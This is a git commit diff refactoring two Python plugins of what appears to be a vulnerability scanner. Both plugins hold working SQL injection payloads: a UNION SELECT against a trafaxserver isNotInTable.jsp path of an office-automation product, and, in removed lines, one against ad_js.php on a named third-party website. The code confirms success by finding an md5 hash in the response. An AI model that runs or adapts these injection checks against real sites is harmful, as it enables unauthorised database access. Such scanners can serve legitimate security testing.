a3f83112da503b67466da08ea7ddc6a7a83694ac
Zend <937791848@qq.com>
2015-09-10 14:24:02 +0800

    update plugins

--- plugins/test/tplugin.py
+++ plugins/test/tplugin.py
@@ -3,30 +3,30 @@
 # author : 'Zend'
 # team   : "gogobirds"
 
-from plugins.init import register_plugin, pluginmap
+from plugins.base import register_plugin, pluginmap
 from pprint import pprint
 from libs.utils import http
 
 
-class TPlugin(object):
-    info = {
-        'app_name': "test",
-        'version': "0.1",
-        'type': "test",
-        'tag': ["test"],
-        'desc': "test is test",
-    }
+info = {
+    'app_name': "test",
+    'version': "0.1",
+    'type': "test",
+    'desc': "test is test",
+}
 
-    @staticmethod
-    @register_plugin("test")
-    def func(args, info=info):
-        pprint(info)
-        payload = '''/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select md5(3.1415)#'''
-        verify_url = args.url + payload
-        res = http.request(verify_url)
-        if res.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in res.content:
-            args.result = "access"
-        return args
+plugin_info = (info['app_name'], info['version'], info['type'], info['desc'])
+
+
+@register_plugin(plugin_info)
+def func(args):
+    pprint(info)
+    payload = '''/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select md5(3.1415)#'''
+    verify_url = args.url + payload
+    res = http.request(verify_url)
+    if res.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in res.content:
+        args.result = "access"
+    return args
 
 
 if __name__ == "__main__":
--- plugins/test2/www.py
+++ plugins/test2/www.py
@@ -3,17 +3,29 @@
 # author : 'Zend'
 # team   : "gogobirds"
 
-from plugins.init import register_plugin, pluginmap
-import urllib2
+from plugins.base import register_plugin
+from libs.utils import http
+from pprint import pprint
 
 
-@register_plugin("2plug")
-def func(name):
-    payload = "/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)"
-    verify_url = "http://www.dw-ids.com/plus/" + payload
-    req = urllib2.Request(verify_url)
-    content = urllib2.urlopen(req).read()
-    print "1234" + name
+info = {
+    'app_name': "www",
+    'version': "0.1",
+    'type': "www",
+    'desc': "www is test",
+}
 
-if __name__ == "__main__":
-    pluginmap["2plug"]()
+plugin_info = (info['app_name'], info['version'], info['type'], info['desc'])
+
+
+@register_plugin(plugin_info)
+def func(args):
+    pprint(info)
+    payload = '''/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select md5(3.1415)#'''
+    verify_url = args.url + payload
+    res = http.request(verify_url)
+    if res.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in res.content:
+        args.result = "access"
+    return args
+
+
